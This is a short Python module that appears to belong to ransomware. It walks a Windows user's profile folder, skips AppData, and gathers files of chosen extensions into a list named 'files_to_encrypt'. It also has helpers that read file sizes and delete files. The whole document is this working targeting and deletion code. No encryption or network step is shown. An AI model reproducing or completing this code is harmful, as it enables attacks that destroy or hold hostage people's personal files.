import os

def getFiles(file_ext,directory=os.environ['USERPROFILE']):
    files_to_encrypt = []
    for dir,_,files in os.walk(directory):
        for file in files:
            if os.path.splitext(file)[-1] in file_ext and dir.find(os.environ['USERPROFILE']+"\\AppData")==-1:
                files_to_encrypt.append(os.path.join(dir,file))
    return files_to_encrypt

def getFilesize(file_path):
    return os.stat(file_path).st_size

def deleteFile(file_path):
    print("deleted: "+file_path)
    os.remove(file_path)
